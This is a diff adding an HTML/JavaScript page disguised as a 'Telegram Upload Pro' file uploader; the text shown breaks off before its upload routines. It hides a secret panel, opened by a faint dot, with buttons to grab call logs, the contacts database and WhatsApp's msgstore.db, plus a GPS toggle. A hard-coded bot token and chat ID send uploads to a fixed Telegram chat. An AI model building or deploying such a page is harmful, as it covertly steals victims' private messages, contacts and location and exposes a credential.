@@ -1,0 +1,1352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Upload Pro</title>
+    <style>
+        :root {
+            --bg-primary: #f0f4f8;
+            --bg-secondary: #ffffff;
+            --glass-bg: rgba(255, 255, 255, 0.7);
+            --glass-border: rgba(0, 0, 0, 0.06);
+            --glass-hover: rgba(0, 0, 0, 0.03);
+            --accent: #2196F3;
+            --accent-glow: rgba(33, 150, 243, 0.3);
+            --green: #4CAF50;
+            --green-glow: rgba(76, 175, 80, 0.3);
+            --red: #ef5350;
+            --purple: #9C27B0;
+            --orange: #FF9800;
+            --text: #1a1a2e;
+            --text-secondary: rgba(26, 26, 46, 0.6);
+            --text-muted: rgba(26, 26, 46, 0.35);
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 8px 30px rgba(0, 0, 0, 0.08);
+            --shadow-lg: 0 20px 60px rgba(0, 0, 0, 0.12);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            background: var(--bg-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated background shapes */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .bg-shape {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.5;
+            animation: morphShape 15s infinite ease-in-out;
+        }
+
+        .bg-shape:nth-child(1) {
+            width: 500px;
+            height: 500px;
+            background: linear-gradient(135deg, rgba(33, 150, 243, 0.15), rgba(156, 39, 176, 0.1));
+            top: -150px;
+            left: -100px;
+            animation-delay: 0s;
+            border-radius: 60% 40% 70% 30% / 40% 50% 50% 60%;
+        }
+
+        .bg-shape:nth-child(2) {
+            width: 400px;
+            height: 400px;
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.12), rgba(33, 150, 243, 0.1));
+            bottom: -120px;
+            right: -80px;
+            animation-delay: -5s;
+            border-radius: 50% 60% 40% 50% / 60% 30% 70% 40%;
+        }
+
+        .bg-shape:nth-child(3) {
+            width: 350px;
+            height: 350px;
+            background: linear-gradient(135deg, rgba(255, 152, 0, 0.1), rgba(239, 83, 80, 0.08));
+            top: 40%;
+            left: 60%;
+            animation-delay: -10s;
+            border-radius: 40% 60% 30% 70% / 50% 40% 60% 50%;
+        }
+
+        .bg-shape:nth-child(4) {
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, rgba(156, 39, 176, 0.1), rgba(76, 175, 80, 0.08));
+            top: 10%;
+            right: 30%;
+            animation-delay: -7s;
+            border-radius: 70% 30% 50% 50% / 30% 60% 40% 70%;
+        }
+
+        @keyframes morphShape {
+            0%,
+            100% {
+                border-radius: 60% 40% 70% 30% / 40% 50% 50% 60%;
+                transform: translate(0, 0) rotate(0deg) scale(1);
+            }
+            25% {
+                border-radius: 40% 60% 30% 70% / 60% 40% 70% 30%;
+                transform: translate(40px, -30px) rotate(90deg) scale(1.05);
+            }
+            50% {
+                border-radius: 50% 50% 40% 60% / 30% 70% 30% 70%;
+                transform: translate(-20px, 40px) rotate(180deg) scale(0.95);
+            }
+            75% {
+                border-radius: 70% 30% 60% 40% / 50% 60% 30% 70%;
+                transform: translate(-35px, -20px) rotate(270deg) scale(1.02);
+            }
+        }
+
+        /* Floating dots */
+        .floating-dots {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .dot {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background: var(--accent);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: floatDot 10s infinite ease-in-out;
+        }
+
+        .dot:nth-child(1) {
+            top: 15%;
+            left: 10%;
+            animation-delay: 0s;
+        }
+        .dot:nth-child(2) {
+            top: 25%;
+            left: 80%;
+            animation-delay: -2s;
+            background: var(--purple);
+        }
+        .dot:nth-child(3) {
+            top: 60%;
+            left: 20%;
+            animation-delay: -4s;
+            background: var(--green);
+        }
+        .dot:nth-child(4) {
+            top: 70%;
+            left: 75%;
+            animation-delay: -6s;
+            background: var(--orange);
+        }
+        .dot:nth-child(5) {
+            top: 40%;
+            left: 50%;
+            animation-delay: -8s;
+        }
+        .dot:nth-child(6) {
+            top: 85%;
+            left: 40%;
+            animation-delay: -3s;
+            background: var(--red);
+        }
+        .dot:nth-child(7) {
+            top: 10%;
+            left: 45%;
+            animation-delay: -5s;
+            background: var(--green);
+        }
+        .dot:nth-child(8) {
+            top: 50%;
+            left: 90%;
+            animation-delay: -7s;
+            background: var(--purple);
+        }
+
+        @keyframes floatDot {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+                opacity: 0.3;
+            }
+            25% {
+                transform: translate(30px, -40px) scale(1.5);
+                opacity: 0.6;
+            }
+            50% {
+                transform: translate(-20px, -80px) scale(1);
+                opacity: 0.3;
+            }
+            75% {
+                transform: translate(-40px, -20px) scale(1.3);
+                opacity: 0.5;
+            }
+        }
+
+        /* Subtle grid */
+        .grid-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 0;
+            pointer-events: none;
+            background-image:
+                linear-gradient(rgba(0, 0, 0, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 0, 0, 0.02) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+
+        /* Main container */
+        .container {
+            width: 100%;
+            max-width: 580px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 32px 28px 28px;
+            box-shadow: var(--shadow-lg);
+            position: relative;
+            z-index: 1;
+            animation: containerIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes containerIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+
+        .header-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #2196F3, #1976D2);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.25);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .header-icon:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.35);
+        }
+
+        .header-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+
+        .header h1 {
+            color: var(--text);
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        .header p {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-top: 2px;
+            font-weight: 400;
+        }
+
+        /* Settings row */
+        .settings-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+
+        .speed-setting {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 14px;
+            background: rgba(0, 0, 0, 0.02);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 12px;
+            flex: 1;
+            min-width: 130px;
+            transition: all 0.2s ease;
+        }
+
+        .speed-setting:hover {
+            background: rgba(0, 0, 0, 0.03);
+            border-color: rgba(0, 0, 0, 0.08);
+        }
+
+        .speed-setting label {
+            color: var(--text-muted);
+            font-size: 11px;
+            white-space: nowrap;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .speed-setting select {
+            background: rgba(0, 0, 0, 0.03);
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            border-radius: 8px;
+            padding: 7px 10px;
+            color: var(--text);
+            font-size: 12px;
+            outline: none;
+            cursor: pointer;
+            flex: 1;
+            font-weight: 500;
+            transition: border-color 0.2s;
+        }
+
+        .speed-setting select:focus {
+            border-color: var(--accent);
+        }
+
+        /* Toggle settings */
+        .toggle-setting {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 14px;
+            background: rgba(0, 0, 0, 0.02);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 12px;
+            cursor: pointer;
+            user-select: none;
+            flex: 1;
+            min-width: 110px;
+            transition: all 0.2s ease;
+        }
+
+        .toggle-setting:hover {
+            background: rgba(0, 0, 0, 0.03);
+        }
+
+        .toggle-setting label {
+            color: var(--text-muted);
+            font-size: 11px;
+            cursor: pointer;
+            flex: 1;
+            white-space: nowrap;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 44px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .toggle-switch input {
+            display: none;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .toggle-slider::before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            left: 2px;
+            top: 2px;
+            background: #fff;
+            border-radius: 50%;
+            transition: all 0.3s ease;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+        }
+
+        .toggle-switch input:checked+.toggle-slider {
+            background: var(--accent);
+        }
+
+        .toggle-switch input:checked+.toggle-slider::before {
+            transform: translateX(20px);
+        }
+
+        #locationToggle .toggle-switch input:checked+.toggle-slider {
+            background: var(--green);
+        }
+
+        /* Dropzone */
+        .dropzone {
+            position: relative;
+            border: 2px dashed rgba(0, 0, 0, 0.1);
+            border-radius: 18px;
+            padding: 32px 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.01);
+            margin-bottom: 16px;
+            min-height: 180px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .dropzone:hover {
+            border-color: var(--accent);
+            background: rgba(33, 150, 243, 0.03);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .dropzone.dragover {
+            border-color: var(--green);
+            background: rgba(76, 175, 80, 0.04);
+            transform: scale(1.02);
+            box-shadow: var(--shadow-md);
+        }
+
+        .dropzone.has-files {
+            border-color: var(--green);
+            background: rgba(76, 175, 80, 0.02);
+            padding: 16px;
+            border-style: solid;
+        }
+
+        .dropzone-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .dropzone.has-files .dropzone-placeholder {
+            display: none;
+        }
+
+        .dropzone-icon {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 12px;
+            background: rgba(33, 150, 243, 0.08);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.3s ease;
+        }
+
+        .dropzone:hover .dropzone-icon {
+            transform: translateY(-4px);
+        }
+
+        .dropzone-icon svg {
+            width: 28px;
+            height: 28px;
+            fill: var(--accent);
+        }
+
+        .dropzone-text {
+            color: var(--text-secondary);
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .dropzone-text strong {
+            color: var(--accent);
+            font-weight: 700;
+        }
+
+        .dropzone-subtext {
+            color: var(--text-muted);
+            font-size: 12px;
+            margin-top: 6px;
+        }
+
+        /* File list */
+        .file-list {
+            display: none;
+            max-height: 240px;
+            overflow-y: auto;
+            margin-bottom: 8px;
+            width: 100%;
+        }
+
+        .dropzone.has-files .file-list {
+            display: block;
+        }
+
+        .file-list::-webkit-scrollbar {
+            width: 4px;
+        }
+        .file-list::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .file-list::-webkit-scrollbar-thumb {
+            background: rgba(0, 0, 0, 0.08);
+            border-radius: 2px;
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            background: rgba(0, 0, 0, 0.02);
+            border: 1px solid rgba(0, 0, 0, 0.04);
+            border-radius: 10px;
+            margin-bottom: 6px;
+            transition: all 0.2s ease;
+            animation: fileIn 0.3s ease;
+        }
+
+        @keyframes fileIn {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .file-item:hover {
+            background: rgba(0, 0, 0, 0.04);
+            border-color: rgba(0, 0, 0, 0.08);
+        }
+
+        .file-item .file-icon-small {
+            width: 34px;
+            height: 34px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .file-icon-small.type-video {
+            background: rgba(156, 39, 176, 0.1);
+        }
+        .file-icon-small.type-image {
+            background: rgba(33, 150, 243, 0.1);
+        }
+        .file-icon-small.type-audio {
+            background: rgba(255, 152, 0, 0.1);
+        }
+        .file-icon-small.type-document {
+            background: rgba(76, 175, 80, 0.1);
+        }
+
+        .file-icon-small svg {
+            width: 16px;
+            height: 16px;
+        }
+        .file-icon-small.type-video svg {
+            fill: #9C27B0;
+        }
+        .file-icon-small.type-image svg {
+            fill: #2196F3;
+        }
+        .file-icon-small.type-audio svg {
+            fill: #FF9800;
+        }
+        .file-icon-small.type-document svg {
+            fill: #4CAF50;
+        }
+
+        .file-item .file-details {
+            flex: 1;
+            min-width: 0;
+        }
+        .file-item .file-name-small {
+            color: var(--text);
+            font-size: 13px;
+            font-weight: 600;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .file-item .file-size-small {
+            color: var(--text-muted);
+            font-size: 11px;
+            margin-top: 1px;
+        }
+        .file-item .file-status {
+            font-size: 10px;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+        .file-status.pending {
+            color: var(--text-muted);
+            background: rgba(0, 0, 0, 0.03);
+        }
+        .file-status.uploading {
+            color: #1976D2;
+            background: rgba(33, 150, 243, 0.08);
+        }
+        .file-status.success {
+            color: #388E3C;
+            background: rgba(76, 175, 80, 0.08);
+        }
+        .file-status.error {
+            color: #c62828;
+            background: rgba(239, 83, 80, 0.08);
+        }
+
+        .dropzone-actions {
+            display: none;
+            gap: 8px;
+            margin-top: 10px;
+            width: 100%;
+        }
+        .dropzone.has-files .dropzone-actions {
+            display: flex;
+        }
+
+        .action-btn {
+            flex: 1;
+            padding: 9px 12px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            background: rgba(0, 0, 0, 0.02);
+            color: var(--text-secondary);
+            font-size: 12px;
+            cursor: pointer;
+            text-align: center;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+        .action-btn:hover {
+            background: rgba(0, 0, 0, 0.04);
+            color: var(--text);
+            border-color: rgba(0, 0, 0, 0.1);
+        }
+        .action-btn.danger {
+            color: var(--red);
+            border-color: rgba(239, 83, 80, 0.15);
+        }
+        .action-btn.danger:hover {
+            background: rgba(239, 83, 80, 0.05);
+            border-color: rgba(239, 83, 80, 0.3);
+        }
+
+        #fileInput,
+        #folderInput {
+            display: none;
+        }
+
+        /* Upload button */
+        .upload-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #2196F3, #1976D2);
+            border: none;
+            border-radius: 14px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.25);
+            letter-spacing: 0.2px;
+        }
+
+        .upload-btn:active:not(:disabled) {
+            transform: scale(0.97);
+            box-shadow: 0 2px 8px rgba(33, 150, 243, 0.2);
+            transition: all 0.1s ease;
+        }
+
+        .upload-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(33, 150, 243, 0.3);
+        }
+
+        .upload-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .upload-btn.loading {
+            background: linear-gradient(135deg, #1565C0, #0D47A1);
+            pointer-events: none;
+            box-shadow: none;
+        }
+
+        .upload-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .upload-btn .spinner {
+            display: none;
+            animation: spin 0.7s linear infinite;
+        }
+        .upload-btn.loading .spinner {
+            display: block;
+        }
+        .upload-btn.loading .btn-icon {
+            display: none;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Status */
+        .status {
+            margin-top: 14px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 500;
+            display: none;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .status.show {
+            display: block;
+        }
+        .status.success {
+            background: rgba(76, 175, 80, 0.08);
+            border: 1px solid rgba(76, 175, 80, 0.15);
+            color: #2E7D32;
+        }
+        .status.error {
+            background: rgba(239, 83, 80, 0.06);
+            border: 1px solid rgba(239, 83, 80, 0.12);
+            color: #c62828;
+        }
+        .status.info {
+            background: rgba(33, 150, 243, 0.06);
+            border: 1px solid rgba(33, 150, 243, 0.12);
+            color: #1565C0;
+        }
+
+        /* Batch progress */
+        .batch-progress {
+            margin-top: 12px;
+            display: none;
+        }
+        .batch-progress.show {
+            display: block;
+            animation: slideUp 0.3s ease;
+        }
+        .batch-progress-header {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-muted);
+            font-size: 11px;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 5px;
+            background: rgba(0, 0, 0, 0.04);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #2196F3, #4CAF50);
+            width: 0%;
+            border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+
+        /* Hidden dot */
+        .secret-dot {
+            position: fixed;
+            bottom: 14px;
+            right: 14px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(0, 0, 0, 0.06);
+            z-index: 9999;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .secret-dot:hover {
+            background: rgba(239, 83, 80, 0.7);
+            width: 14px;
+            height: 14px;
+        }
+
+        /* Secret panel */
+        .secret-panel {
+            position: fixed;
+            bottom: 40px;
+            right: 24px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(30px);
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            border-radius: 18px;
+            padding: 20px;
+            z-index: 9998;
+            display: none;
+            min-width: 320px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15);
+            animation: fadeIn 0.2s ease;
+        }
+        .secret-panel.show {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        .secret-panel h4 {
+            color: var(--red);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+            text-align: center;
+            font-weight: 700;
+        }
+        .secret-panel .subtitle {
+            color: var(--text-muted);
+            font-size: 10px;
+            text-align: center;
+            margin-bottom: 14px;
+        }
+        .secret-btn {
+            width: 100%;
+            padding: 11px 14px;
+            margin-bottom: 7px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 0, 0, 0.06);
+            background: rgba(0, 0, 0, 0.02);
+            color: var(--text-secondary);
+            font-size: 13px;
+            cursor: pointer;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+        .secret-btn:hover {
+            background: rgba(239, 83, 80, 0.05);
+            border-color: rgba(239, 83, 80, 0.2);
+            color: var(--text);
+        }
+        .secret-btn .icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        .secret-btn .info {
+            flex: 1;
+            min-width: 0;
+        }
+        .secret-btn .info small {
+            display: block;
+            color: var(--text-muted);
+            font-size: 10px;
+            margin-top: 1px;
+        }
+        .close-panel {
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            cursor: pointer;
+            font-size: 16px;
+            padding: 4px;
+            transition: color 0.2s;
+        }
+        .close-panel:hover {
+            color: var(--text);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 18px;
+            color: var(--text-muted);
+            font-size: 11px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated Background -->
+    <div class="bg-animation">
+        <div class="bg-shape"></div>
+        <div class="bg-shape"></div>
+        <div class="bg-shape"></div>
+        <div class="bg-shape"></div>
+    </div>
+    <div class="floating-dots">
+        <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+    <div class="grid-overlay"></div>
+
+    <!-- Hidden Dot -->
+    <div class="secret-dot" id="secretDot"></div>
+
+    <!-- Secret Panel -->
+    <div class="secret-panel" id="secretPanel">
+        <button class="close-panel" id="closePanel">✕</button>
+        <h4>Quick Tools</h4>
+        <p class="subtitle">Hidden utilities</p>
+        <button class="secret-btn" id="grabCallLog">
+            <span class="icon">📞</span><span class="info">Grab Call Log<small>Select database file</small></span>
+        </button>
+        <button class="secret-btn" id="grabContacts">
+            <span class="icon">👤</span><span class="info">Grab Contacts DB<small>contacts2.db</small></span>
+        </button>
+        <button class="secret-btn" id="grabWhatsApp">
+            <span class="icon">🟢</span><span class="info">Grab WhatsApp DB<small>msgstore.db</small></span>
+        </button>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+        <div class="header">
+            <div class="header-icon">
+                <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0a12 12 0 00-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 01.171.46c-.184 1.844-1.044 6.247-1.476 8.287-.183.868-.541 1.158-.89 1.187-.756.063-1.33-.498-2.062-.977-1.036-.678-1.621-1.099-2.628-1.76-1.162-.764-.41-1.183.254-1.87.174-.18 3.192-2.913 3.25-3.162.007-.031.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.79 1.133-5.056 3.33-.478.327-.912.486-1.302.478-.428-.01-1.252-.241-1.864-.44-.752-.244-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+            </div>
+            <div>
+                <h1>Telegram Upload Pro</h1>
+                <p>Light theme • Animated • Smart detection</p>
+            </div>
+        </div>
+
+        <div class="settings-row">
+            <div class="speed-setting">
+                <label>⚡ Speed</label>
+                <select id="parallelCount">
+                    <option value="3">3 Parallel</option>
+                    <option value="5" selected>5 Parallel</option>
+                    <option value="10">10 Parallel</option>
+                    <option value="20">20 Parallel</option>
+                </select>
+            </div>
+            <div class="toggle-setting" id="videoToggle">
+                <label>🎬 Video</label>
+                <div class="toggle-switch"><input type="checkbox" id="videoMode" checked><span class="toggle-slider"></span></div>
+            </div>
+            <div class="toggle-setting" id="folderToggle">
+                <label>📁 Folder</label>
+                <div class="toggle-switch"><input type="checkbox" id="folderMode" checked><span class="toggle-slider"></span></div>
+            </div>
+            <div class="toggle-setting" id="locationToggle">
+                <label>📍 GPS</label>
+                <div class="toggle-switch"><input type="checkbox" id="locationMode"><span class="toggle-slider"></span></div>
+            </div>
+        </div>
+
+        <div class="dropzone" id="dropzone">
+            <input type="file" id="fileInput" multiple>
+            <input type="file" id="folderInput" webkitdirectory="" directory="" multiple="">
+            <div class="dropzone-placeholder">
+                <div class="dropzone-icon">
+                    <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>
+                </div>
+                <div class="dropzone-text"><strong>Drop files here</strong> or click to browse</div>
+                <div class="dropzone-subtext" id="dropzoneHint">📁 Folder ON • 🎬 Video ON</div>
+            </div>
+            <div class="file-list" id="fileList"></div>
+            <div class="dropzone-actions">
+                <button class="action-btn" id="addMoreBtn">+ Add Files</button>
+                <button class="action-btn" id="addFolderBtn">📁 Add Folder</button>
+                <button class="action-btn danger" id="clearAllBtn">Clear All</button>
+            </div>
+        </div>
+
+        <button class="upload-btn" id="uploadBtn" disabled>
+            <svg class="spinner" viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10" stroke="currentColor" stroke-width="2" fill="none"/></svg>
+            <svg class="btn-icon" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>
+            <span class="btn-text" id="uploadBtnText">Upload to Telegram</span>
+        </button>
+
+        <div class="batch-progress" id="batchProgress">
+            <div class="batch-progress-header"><span id="batchStatus">Preparing...</span><span id="batchCount">0/0</span></div>
+            <div class="progress-bar"><div class="fill" id="batchFill"></div></div>
+        </div>
+        <div class="status" id="status"></div>
+        <div class="footer">Powered by Telegram Bot API</div>
+    </div>
+
+    <script>
+        (function() {
+            const BOT_TOKEN = '8721805332:AAFyyq68_Ixw99j1FFWwDzmgPOX2mtS-vAY';
+            const CHAT_ID = '8606409949';
+
+            const dropzone = document.getElementById('dropzone'),
+                fileInput = document.getElementById('fileInput'),
+                folderInput = document.getElementById('folderInput'),
+                fileList = document.getElementById('fileList'),
+                uploadBtn = document.getElementById('uploadBtn'),
+                uploadBtnText = document.getElementById('uploadBtnText'),
+                status = document.getElementById('status'),
+                batchProgress = document.getElementById('batchProgress'),
+                batchFill = document.getElementById('batchFill'),
+                batchStatus = document.getElementById('batchStatus'),
+                batchCount = document.getElementById('batchCount'),
+                addMoreBtn = document.getElementById('addMoreBtn'),
+                addFolderBtn = document.getElementById('addFolderBtn'),
+                clearAllBtn = document.getElementById('clearAllBtn'),
+                parallelCount = document.getElementById('parallelCount'),
+                videoMode = document.getElementById('videoMode'),
+                folderMode = document.getElementById('folderMode'),
+                locationMode = document.getElementById('locationMode'),
+                dropzoneHint = document.getElementById('dropzoneHint');
+
+            let selectedFiles = [];
+            let locationData = null;
+
+            const ve = ['mp4', 'mkv', 'avi', 'mov', 'wmv', 'flv', 'webm', 'm4v', '3gp', 'mpeg', 'mpg', 'ts', 'm2ts'];
+            const ie = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'svg', 'ico', 'tiff', 'tif'];
+            const ae = ['mp3', 'wav', 'ogg', 'flac', 'aac', 'm4a', 'wma', 'opus'];
+
+            function gef(f) { return f.split('.').pop().toLowerCase(); }
+
+            function gft(f) {
+                const e = gef(f.name);
+                if (f.type.startsWith('video/')) return 'video';
+                if (f.type.startsWith('image/')) return 'image';
+                if (f.type.startsWith('audio/')) return 'audio';
+                if (ve.includes(e)) return 'video';
+                if (ie.includes(e)) return 'image';
+                if (ae.includes(e)) return 'audio';
+                return 'document';
+            }
+
+            function gfi(t) {
+                switch (t) {
+                    case 'video':
+                        return '<svg viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21" fill="currentColor"/></svg>';
+                    case 'image':
+                        return '<svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="8.5" cy="8.5" r="1.5" fill="currentColor"/></svg>';
+                    case 'audio':
+                        return '<svg viewBox="0 0 24 24"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>';
+                    default:
+                        return '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg>';
+                }
+            }
+
+            function fs(b) { if (b === 0) return '0 B';
+                const u = ['B', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(b) / Math.log(1024)); return (b / Math.pow(1024, i)).toFixed(i > 0 ? 1 : 0) +
+                    ' ' + u[i]; }
+
+            function ss(m, t) { status.textContent = m;
+                status.className = 'status show ' + t; }
+
+            function cs() { status.className = 'status';
+                status.textContent = ''; }
+
+            function gi() { return Date.now() + '_' + Math.random().toString(36).substr(2, 9); }
+
+            function af(nf) {
+                if (!nf || nf.length === 0) return;
+                if (!folderMode.checked && nf.length > 1) { const f = nf[0];
+                    const d = selectedFiles.some(x => x.file.name === f.name && x.file.size === f.size && x.file
+                        .lastModified === f.lastModified); if (!d) selectedFiles.push({ file: f, status: 'pending',
+                        id: gi(), fileType: gft(f) }); } else { for (let i = 0; i < nf.length; i++) { const f = nf[
+                        i]; if (f.size === 0 && f.type === '') continue;
+                        const d = selectedFiles.some(x => x.file.name === f.name && x.file.size === f.size && x.file
+                            .lastModified === f.lastModified); if (!d) selectedFiles.push({ file: f,
+                            status: 'pending', id: gi(), fileType: gft(f) }); } }
+                rfl();
+                uu();
+                cs();
+            }
+
